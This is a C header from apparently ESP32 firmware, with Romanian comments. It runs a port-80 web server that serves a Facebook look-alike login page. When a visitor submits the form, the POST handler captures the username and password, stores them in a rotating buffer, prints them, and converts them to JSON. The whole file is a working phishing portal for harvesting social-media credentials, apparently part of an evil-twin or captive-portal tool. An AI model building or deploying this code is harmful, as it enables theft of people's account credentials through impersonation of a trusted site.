#ifndef FACEBOOK_WEB_SERVER_H
#define FACEBOOK_WEB_SERVER_H

// Structură pentru a păstra o singură intrare de credențiale
typedef struct {
    char username[128];
    char password[128];
} cred_entry_t;

#define MAX_CRED_ENTRIES 10
typedef struct {
    cred_entry_t entries[MAX_CRED_ENTRIES];
    int count;
} cred_buffer_t;

cred_buffer_t cred_buffer = {0};

static void store_credentials(cred_buffer_t* buffer, const char* user, const char* pass) {
    strncpy(buffer->entries[buffer->count].username, user, sizeof(buffer->entries[buffer->count].username) - 1);
    strncpy(buffer->entries[buffer->count].password, pass, sizeof(buffer->entries[buffer->count].password) - 1);
    buffer->count++;
    if (buffer->count >= MAX_CRED_ENTRIES) {
        buffer->count = 0;
    }
}

void print_cred_buffer(cred_buffer_t* buffer){
    int i;
    printf("Avem %d linii\n", buffer->count);
    for(i = 0; i<buffer->count;i++){
        printf("username=%s  pass=%s\n", buffer->entries[i].username, buffer->entries[i].password);
    }
}
char* cred_buffer_to_json(cred_buffer_t* buffer) {
    if (!buffer) return NULL;

    size_t cap = 256;
    char *json = malloc(cap);
    if (!json) return NULL;

    size_t len = 0;
    len += snprintf(json + len, cap - len, "[");

    // Determinăm câte intrări valide avem
    int n = buffer->count < MAX_CRED_ENTRIES ? buffer->count : MAX_CRED_ENTRIES;

    for (int i = 0; i < n; ++i) {
        const char *user = buffer->entries[i].username;
        const char *pass = buffer->entries[i].password;

        // Calculează spațiul necesar
        size_t needed = snprintf(NULL, 0,
                                 "{\"username\":\"%s\",\"password\":\"%s\"}%s",
                                 user, pass,
                                 (i < n - 1) ? "," : "");

        // Realocare dacă e nevoie
        if (len + needed + 1 > cap) {
            cap = (len + needed + 1) * 2;
            char *tmp = realloc(json, cap);
            if (!tmp) { free(json); return NULL; }
            json = tmp;
        }

        // Adaugă obiectul
        len += snprintf(json + len, cap - len,
                        "{\"username\":\"%s\",\"password\":\"%s\"}%s",
                        user, pass,
                        (i < n - 1) ? "," : "");
    }

    // Închidem array-ul
    if (len + 2 + 1 > cap) {
        cap = len + 3;
        char *tmp = realloc(json, cap);
        if (!tmp) { free(json); return NULL; }
        json = tmp;
    }
    len += snprintf(json + len, cap - len, "]");

    return json;
}

void handle_facebook_connection(http_request_t* req, int client_sock) {
    if(strcmp(req->method, "GET") == 0){
        ESP_LOGI("FacebookWebServer", "Handling GET request");
        http_send_html_response(client_sock, facebook_page_html);
    }
    else if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("FacebookWebServer", "Handling POST request");
        printf("BODY: %s\n", req->body);
        char username[128];
        char password[128];
        int ret = extract_form_field_to_buffer(req->body, "username", username, 128);
        if (ret != 0) {
            ESP_LOGE("FacebookWebServer", "Failed to extract username");
            http_send_error_response(client_sock);
            return;
        }
        ret = extract_form_field_to_buffer(req->body, "password", password, 128);
        if (ret != 0) {
            ESP_LOGE("FacebookWebServer", "Failed to extract password");
            http_send_error_response(client_sock);
            return;
        }
        store_credentials(&cred_buffer, username, password);

        http_send_ok_response(client_sock);
    } else {
        ESP_LOGI("FacebookWebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
}

void serve_facebook_page(){
    ESP_LOGI("FacebookWebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("FacebookWebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 80, INADDR_ANY) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("FacebookWebServer", "Web server started on port 80");

    while (1) {
        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("FacebookWebServer", "Connection accepted...");

        char buffer[1024];
        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
        if (len < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        
        http_request_t req = http_request_parse(buffer);
        printf("Facebook Request Method: %s\n", req.method);
        printf("Facebook Request URL: %s\n", req.url);

        handle_facebook_connection(&req, client_sock);

        close(client_sock);
    }
}


#endif // FACEBOOK_WEB_SERVER_H